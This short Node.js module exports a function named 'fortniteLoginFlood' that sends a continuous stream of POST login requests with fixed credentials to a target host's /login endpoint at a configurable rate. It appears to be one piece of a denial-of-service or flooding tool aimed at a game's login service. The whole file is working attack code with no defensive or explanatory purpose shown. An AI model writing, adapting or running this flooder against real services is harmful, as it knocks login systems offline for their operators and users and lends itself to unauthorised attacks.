const request = require('request');

function fortniteLoginFlood(target, rateLimit, logOutput) {
    setInterval(() => {
        const options = {
            url: `https://${target}/login`,
            method: 'POST',
            json: {
                username: 'bot',
                password: 'password'
            }
        };

        request(options, (error, response, body) => {
            if (error) {
                logOutput('Error: ' + error.message);
            } else {
                logOutput('Sent Fortnite login request');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = fortniteLoginFlood;
